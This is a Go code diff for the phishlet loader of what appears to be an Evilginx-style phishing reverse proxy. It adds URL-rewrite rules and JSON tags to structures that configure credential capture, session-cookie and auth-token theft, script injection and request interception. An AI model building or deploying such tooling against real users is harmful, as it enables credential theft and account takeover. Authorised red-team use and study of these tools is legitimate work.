@@ -105,6 +105,27 @@ type Intercept struct {
 	mime        string         `mapstructure:"mime"`
 }
 
+type URLRewriteRule struct {
+	Trigger URLRewriteTrigger `yaml:"trigger" json:"trigger" mapstructure:"trigger"`
+	Rewrite URLRewriteConfig  `yaml:"rewrite" json:"rewrite" mapstructure:"rewrite"`
+}
+
+type URLRewriteTrigger struct {
+	Domains []string `yaml:"domains" json:"domains" mapstructure:"domains"`
+	Paths   []string `yaml:"paths" json:"paths" mapstructure:"paths"`
+}
+
+type URLRewriteConfig struct {
+	Path        string       `yaml:"path" json:"path" mapstructure:"path"`
+	Query       []QueryParam `yaml:"query" json:"query" mapstructure:"query"`
+	ExcludeKeys []string     `yaml:"exclude_keys" json:"exclude_keys" mapstructure:"exclude_keys"`
+}
+
+type QueryParam struct {
+	Key   string `yaml:"key" json:"key" mapstructure:"key"`
+	Value string `yaml:"value" json:"value" mapstructure:"value"`
+}
+
 type Phishlet struct {
 	Name             string
 	ParentName       string
@@ -129,109 +150,112 @@ type Phishlet struct {
 	login            LoginUrl
 	js_inject        []JsInject
 	intercept        []Intercept
+	RewriteURLs      []URLRewriteRule
 	customParams     map[string]string
 	isTemplate       bool
+	V2               *PhishletV2
 }
 
 type ConfigParam struct {
-	Name     string  `mapstructure:"name"`
-	Default  *string `mapstructure:"default"`
-	Required *bool   `mapstructure:"required"`
+	Name     string  `mapstructure:"name" json:"name"`
+	Default  *string `mapstructure:"default" json:"default"`
+	Required *bool   `mapstructure:"required" json:"required"`
 }
 
 type ConfigProxyHost struct {
-	PhishSub   *string `mapstructure:"phish_sub"`
-	OrigSub    *string `mapstructure:"orig_sub"`
-	Domain     *string `mapstructure:"domain"`
-	Session    bool    `mapstructure:"session"`
-	IsLanding  bool    `mapstructure:"is_landing"`
-	AutoFilter *bool   `mapstructure:"auto_filter"`
+	PhishSub   *string `mapstructure:"phish_sub" json:"phish_sub"`
+	OrigSub    *string `mapstructure:"orig_sub" json:"orig_sub"`
+	Domain     *string `mapstructure:"domain" json:"domain"`
+	Session    bool    `mapstructure:"session" json:"session"`
+	IsLanding  bool    `mapstructure:"is_landing" json:"is_landing"`
+	AutoFilter *bool   `mapstructure:"auto_filter" json:"auto_filter"`
 }
 
 type ConfigSubFilter struct {
-	Hostname     *string   `mapstructure:"triggers_on"`
-	Sub          *string   `mapstructure:"orig_sub"`
-	Domain       *string   `mapstructure:"domain"`
-	Search       *string   `mapstructure:"search"`
-	Replace      *string   `mapstructure:"replace"`
-	Mimes        *[]string `mapstructure:"mimes"`
-	RedirectOnly bool      `mapstructure:"redirect_only"`
-	WithParams   *[]string `mapstructure:"with_params"`
+	Hostname     *string   `mapstructure:"triggers_on" json:"triggers_on"`
+	Sub          *string   `mapstructure:"orig_sub" json:"orig_sub"`
+	Domain       *string   `mapstructure:"domain" json:"domain"`
+	Search       *string   `mapstructure:"search" json:"search"`
+	Replace      *string   `mapstructure:"replace" json:"replace"`
+	Mimes        *[]string `mapstructure:"mimes" json:"mimes"`
+	RedirectOnly bool      `mapstructure:"redirect_only" json:"redirect_only"`
+	WithParams   *[]string `mapstructure:"with_params" json:"with_params"`
 }
 
 type ConfigAuthToken struct {
-	Domain *string   `mapstructure:"domain"`
-	Keys   *[]string `mapstructure:"keys"`
-	Type   *string   `mapstructure:"type"`
-	Path   *string   `mapstructure:"path"`
-	Name   *string   `mapstructure:"name"`
-	Search *string   `mapstructure:"search"`
-	Header *string   `mapstructure:"header"`
+	Domain *string   `mapstructure:"domain" json:"domain"`
+	Keys   *[]string `mapstructure:"keys" json:"keys"`
+	Type   *string   `mapstructure:"type" json:"type"`
+	Path   *string   `mapstructure:"path" json:"path"`
+	Name   *string   `mapstructure:"name" json:"name"`
+	Search *string   `mapstructure:"search" json:"search"`
+	Header *string   `mapstructure:"header" json:"header"`
 }
 
 type ConfigPostField struct {
-	Key    *string `mapstructure:"key"`
-	Search *string `mapstructure:"search"`
-	Type   string  `mapstructure:"type"`
+	Key    *string `mapstructure:"key" json:"key"`
+	Search *string `mapstructure:"search" json:"search"`
+	Type   string  `mapstructure:"type" json:"type"`
 }
 
 type ConfigCredentials struct {
-	Username *ConfigPostField   `mapstructure:"username"`
-	Password *ConfigPostField   `mapstructure:"password"`
-	Custom   *[]ConfigPostField `mapstructure:"custom"`
+	Username *ConfigPostField   `mapstructure:"username" json:"username"`
+	Password *ConfigPostField   `mapstructure:"password" json:"password"`
+	Custom   *[]ConfigPostField `mapstructure:"custom" json:"custom"`
 }
 
 type ConfigForcePostSearch struct {
-	Key    *string `mapstructure:"key"`
-	Search *string `mapstructure:"search"`
+	Key    *string `mapstructure:"key" json:"key"`
+	Search *string `mapstructure:"search" json:"search"`
 }
 
 type ConfigForcePostForce struct {
-	Key   *string `mapstructure:"key"`
-	Value *string `mapstructure:"value"`
+	Key   *string `mapstructure:"key" json:"key"`
+	Value *string `mapstructure:"value" json:"value"`
 }
 
 type ConfigForcePost struct {
-	Path   *string                  `mapstructure:"path"`
-	Search *[]ConfigForcePostSearch `mapstructure:"search"`
-	Force  *[]ConfigForcePostForce  `mapstructure:"force"`
-	Type   *string                  `mapstructure:"type"`
+	Path   *string                  `mapstructure:"path" json:"path"`
+	Search *[]ConfigForcePostSearch `mapstructure:"search" json:"search"`
+	Force  *[]ConfigForcePostForce  `mapstructure:"force" json:"force"`
+	Type   *string                  `mapstructure:"type" json:"type"`
 }
 
 type ConfigLogin struct {
-	Domain *string `mapstructure:"domain"`
-	Path   *string `mapstructure:"path"`
+	Domain *string `mapstructure:"domain" json:"domain"`
+	Path   *string `mapstructure:"path" json:"path"`
 }
 
 type ConfigJsInject struct {
-	TriggerDomains *[]string `mapstructure:"trigger_domains"`
-	TriggerPaths   *[]string `mapstructure:"trigger_paths"`
-	TriggerParams  []string  `mapstructure:"trigger_params"`
-	Script         *string   `mapstructure:"script"`
+	TriggerDomains *[]string `mapstructure:"trigger_domains" json:"trigger_domains"`
+	TriggerPaths   *[]string `mapstructure:"trigger_paths" json:"trigger_paths"`
+	TriggerParams  []string  `mapstructure:"trigger_params" json:"trigger_params"`
+	Script         *string   `mapstructure:"script" json:"script"`
 }
 
 type ConfigIntercept struct {
-	Domain     *string `mapstructure:"domain"`
-	Path       *string `mapstructure:"path"`
-	HttpStatus *int    `mapstructure:"http_status"`
-	Body       *string `mapstructure:"body"`
-	Mime       *string `mapstructure:"mime"`
+	Domain     *string `mapstructure:"domain" json:"domain"`
+	Path       *string `mapstructure:"path" json:"path"`
+	HttpStatus *int    `mapstructure:"http_status" json:"http_status"`
+	Body       *string `mapstructure:"body" json:"body"`
+	Mime       *string `mapstructure:"mime" json:"mime"`
 }
 
 type ConfigPhishlet struct {
-	Name        string             `mapstructure:"name"`
-	RedirectUrl string             `mapstructure:"redirect_url"`
-	Params      *[]ConfigParam     `mapstructure:"params"`
-	ProxyHosts  *[]ConfigProxyHost `mapstructure:"proxy_hosts"`
-	SubFilters  *[]ConfigSubFilter `mapstructure:"sub_filters"`
-	AuthTokens  *[]ConfigAuthToken `mapstructure:"auth_tokens"`
-	AuthUrls    []string           `mapstructure:"auth_urls"`
-	Credentials *ConfigCredentials `mapstructure:"credentials"`
-	ForcePosts  *[]ConfigForcePost `mapstructure:"force_post"`
-	LandingPath *[]string          `mapstructure:"landing_path"`
-	LoginItem   *ConfigLogin       `mapstructure:"login"`
-	JsInject    *[]ConfigJsInject  `mapstructure:"js_inject"`
-	Intercept   *[]ConfigIntercept `mapstructure:"intercept"`
+	Name        string             `mapstructure:"name" json:"name"`
+	RedirectUrl string             `mapstructure:"redirect_url" json:"redirect_url"`
+	Params      *[]ConfigParam     `mapstructure:"params" json:"params"`
+	ProxyHosts  *[]ConfigProxyHost `mapstructure:"proxy_hosts" json:"proxy_hosts"`
+	SubFilters  *[]ConfigSubFilter `mapstructure:"sub_filters" json:"sub_filters"`
+	AuthTokens  *[]ConfigAuthToken `mapstructure:"auth_tokens" json:"auth_tokens"`
+	AuthUrls    []string           `mapstructure:"auth_urls" json:"auth_urls"`
+	Credentials *ConfigCredentials `mapstructure:"credentials" json:"credentials"`
+	ForcePosts  *[]ConfigForcePost `mapstructure:"force_post" json:"force_post"`
+	LandingPath *[]string          `mapstructure:"landing_path" json:"landing_path"`
+	LoginItem   *ConfigLogin       `mapstructure:"login" json:"login"`
+	JsInject    *[]ConfigJsInject  `mapstructure:"js_inject" json:"js_inject"`
+	Intercept   *[]ConfigIntercept `mapstructure:"intercept" json:"intercept"`
+	RewriteURLs *[]URLRewriteRule  `mapstructure:"rewrite_urls" json:"rewrite_urls"`
 }
 
 func NewPhishlet(site string, path string, customParams *map[string]string, cfg *Config) (*Phishlet, error) {
@@ -264,6 +288,7 @@ func (p *Phishlet) Clear() {
 	p.password.search = nil
 	p.custom = []PostField{}
 	p.forcePost = []ForcePost{}
+	p.RewriteURLs = []URLRewriteRule{}
 	p.customParams = make(map[string]string)
 	p.isTemplate = false
 }
@@ -315,6 +340,11 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 		return err
 	}
 
+	return p.LoadFromConfig(fp, customParams)
+}
+
+func (p *Phishlet) LoadFromConfig(fp ConfigPhishlet, customParams *map[string]string) error {
+	var err error
 	if fp.Params != nil {
 		if len(*fp.Params) > 0 {
 			p.isTemplate = true
@@ -337,7 +367,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			}
 			for k, v := range *customParams {
 				if _, ok := pall[k]; !ok {
-					log.Warning("phishlets: [%s] incorrect parameter key specified: %s", site, k)
+					log.Warning("phishlets: [%s] incorrect parameter key specified: %s", p.Name, k)
 					delete(*customParams, k)
 					continue
 				}
@@ -363,15 +393,6 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 				p.customParams[param.Name] = val
 			}
 		}
-
-		/*
-			if customParams != nil {
-				p.customParams = *customParams
-			} else {
-				for _, param := range *fp.Params {
-					p.customParams[param.Name] = param.Default
-				}
-			}*/
 	}
 
 	if fp.ProxyHosts == nil {
@@ -480,7 +501,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			for n := range *js.TriggerPaths {
 				(*js.TriggerPaths)[n] = p.paramVal((*js.TriggerPaths)[n])
 			}
-			err := p.addJsInject(*js.TriggerDomains, *js.TriggerPaths, js.TriggerParams, p.paramVal(*js.Script))
+			err = p.addJsInject(*js.TriggerDomains, *js.TriggerPaths, js.TriggerParams, p.paramVal(*js.Script))
 			if err != nil {
 				return err
 			}
@@ -488,7 +509,6 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 	}
 	if fp.Intercept != nil {
 		for _, ic := range *fp.Intercept {
-			var err error
 			var body, mime string
 			if ic.Domain == nil {
 				return fmt.Errorf("intercept: missing `domain` field")
@@ -518,6 +538,11 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			}
 		}
 	}
+
+	if fp.RewriteURLs != nil {
+		p.RewriteURLs = *fp.RewriteURLs
+	}
+
 	for _, at := range *fp.AuthTokens {
 		ttype := "cookie"
 		if at.Type != nil {
@@ -538,7 +563,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			for n := range *at.Keys {
 				(*at.Keys)[n] = p.paramVal((*at.Keys)[n])
 			}
-			err := p.addCookieAuthTokens(p.paramVal(*at.Domain), *at.Keys)
+			err = p.addCookieAuthTokens(p.paramVal(*at.Domain), *at.Keys)
 			if err != nil {
 				return err
 			}
@@ -556,7 +581,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 				return fmt.Errorf("auth_tokens: 'search' not found for body auth token")
 			}
 
-			err := p.addBodyAuthToken(p.paramVal(*at.Domain), p.paramVal(*at.Path), p.paramVal(*at.Name), p.paramVal(*at.Search))
+			err = p.addBodyAuthToken(p.paramVal(*at.Domain), p.paramVal(*at.Path), p.paramVal(*at.Name), p.paramVal(*at.Search))
 			if err != nil {
 				return err
 			}
@@ -574,7 +599,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 				return fmt.Errorf("auth_tokens: 'header' not found for http auth token")
 			}
 
-			err := p.addHttpAuthToken(p.paramVal(*at.Domain), p.paramVal(*at.Path), p.paramVal(*at.Name), p.paramVal(*at.Header))
+			err = p.addHttpAuthToken(p.paramVal(*at.Domain), p.paramVal(*at.Path), p.paramVal(*at.Name), p.paramVal(*at.Header))
 			if err != nil {
 				return err
 			}
@@ -1105,4 +1130,8 @@ func (p *Phishlet) paramVal(s string) string {
 		}
 	}
 	return ret
+}
+
+func (p *Phishlet) GetRewriteURLs() []URLRewriteRule {
+	return p.RewriteURLs
 }
